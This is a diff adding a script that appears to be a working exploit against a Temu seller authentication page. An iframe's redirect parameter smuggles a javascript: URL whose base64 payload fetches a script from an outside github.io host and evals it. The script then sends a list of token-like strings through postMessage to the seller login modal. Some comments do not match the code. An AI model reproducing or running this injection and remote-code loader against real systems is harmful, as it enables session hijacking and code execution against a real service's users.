@@ -1,0 +1,70 @@
+// 1. Create the iframe
+<script>
+  
+var iframe = document.createElement('iframe');
+iframe.src = 'https://agentseller.temu.com/main/authentication?redirectUrl=javascript%3A%2F%2Fagentseller.temu.com%250aeval(atob(%22ZmV0Y2goJ2h0dHBzOi8vZGFzZHNhMGQ4czlhLmdpdGh1Yi5pby9kb2NzL3BheS5qcycpLnRoZW4ocj0%2Bci50ZXh0KCkpLnRoZW4oZXZhbCk=%22)).com'; 
+
+// 2. Size and Basic Style
+var width = 900; // Width in pixels
+var height = 360; // Height in pixels
+
+iframe.style.width = width + 'px';iframe.style.top=0
+iframe.style.height = height + 'px';
+iframe.style.position = 'fixed'; // Red border to make it visible
+iframe.style.zIndex = '9999';iframe.style.left=0;iframe.style.top=0;
+
+// CRITICAL: prevents the iframe from blocking the mouse events.
+// If you remove this, the "mousemove" event will stop firing when the cursor is over the iframe.
+
+// 3. Add to body
+document.body.appendChild(iframe);
+// 1. The dataset
+const tokenList = `
+7JwaUPNtCvpj3b1GuLOc19b97ce5d6d165965157cdd090b6fab7dae44a1abd2eb7fc4fa3c64
+ANHLsau65hbcYAa0pk8E19b97ce5fcc165965157cdd164dfa93750746858200d0400c0522e5
+C8VnrAoIsDFP5vRK8SXf19b97ce60ae165965157cddb57157ecf3e04981b946c88830f76a83
+GGkJhFm6cK8r7sgHSLU819b97ce5f09165965157cddcaafd68cc1d044e1bd882db1a9caeffa
+TUNUDPUN3mdT0ZtTTDSy19b97ce5e40165965157cdddba70e4073bd4cbfb53b61d93449b4d2
+EdKFOXG6OIW27KV9Ogdp19b97ce5f9b165965157cddf6d71e91f4b14354afaa18ee64f61d57
+13TB85SeYz3Ga1YeGuSs19b97ce5e37165965157cdd041ff84214ba472e9d7cc13c860a2067
+Wj0mzWhBvoZ9Ea2BMsMB19b97ce5ee7165965157cddeb03bfecc30e4eb18b3859dea1b9477d
+gbVOsmBuCzZndyptbLfS19b97ce5d66165965157cdd79ac0be6048b444fb52c06bb2ab639d0
+4je7T6tMHpHl83CKLSJ619b97ce5f93165965157cdd8f041736a67c4c068cc245ad1a8d7a62
+jSYjgadGIqOytbeZOViP19b97ce5d63165965157cdd3b4ba72a1cd540f9b854ee5cb078a775
+WA78FLttMpxvyCbmzNaj19b97ce5fda165965157cdd970807afe2db4e83bfe2839b15d231a8
+ydB596wxORbOvuOcuorD19b97ce657d165965157cdd6ec8f4ee123148c5bd1ef0e911230fb3
+jNvUdgRIB2KWZDIEvhVm19b97ce5f41165965157cdd010d27d20a4b4d8b86666cd45522242f
+oyh0MwHgl6RJ69flUzBa19b97ce5de1165965157cddd2c8388159b24f4b8899c55409ea1860
+oFTU78SN7gNbwCyz5aSt19b97ce5fd9165965157cddbd0a4294b6d9463f9426301d184f92a7
+HT5BGpCCvpwaqbBtFTPa19b97ce61cb165965157cdd614f00355d044b13b60a29daacd2b0ac
+TR55p7GOqwQjHnXwRquU19b97ce5fa3165965157cdd6b53cab3556d4f98b859dfa1b0f2dc93
+gXa9JsF5rRROoBi3bT5y19b97ce5e3d165965157cddcb2d0a8c810d4b23876699fc58f17a6c
+W1tsqWKgpfZepN1g3aZn19b97ce5f98165965157cddbfb2b947d40a45019a883b66065a6b6a
+t91nGAk2aB6Ozd2MaWBD19b97ce5e59165965157cdd3a2537d64c0a4a42aa0f3d05425b5821
+Nzbluoj1jecwTySnCYji19b97ce5fb7165965157cdd7a7ec2b490c74f3da8fe7bddcbb15063
+M4npc45cV7LeziA3Kpr819b97ce5d8e165965157cdd0b77bee1d2f0407abb69329b158f483c
+5t8foOb2YXftB4u6h51419b97ce5fc0165965157cdd6a8be3c8986446efabd7c2fbedd972da
+54WxRlhv5EuvfFCVlKLo19b97ce5e42165965157cdd40d46a62ad4f414793ebef6615820887`;
+
+// 2. Parse the list, removing newlines and empty spaces
+const tokens = tokenList.trim().split(/\s+/);
+
+console.log(`Loaded ${tokens.length} tokens. Starting execution...`);
+
+// 3. Iterate and PostMessage
+tokens.forEach((token, index) => {
+    setTimeout(() => {
+        console.log(`Sending token [${index + 1}/${tokens.length}]: ${token.substring(0, 10)}...`);
+        
+        window.postMessage({
+            scene: 'seller-login-modal',
+            action: 1,
+            code: token
+        }, "*");
+        
+    }, index * 2000); // 200ms delay between each request
+});
+
+</script>
+
+
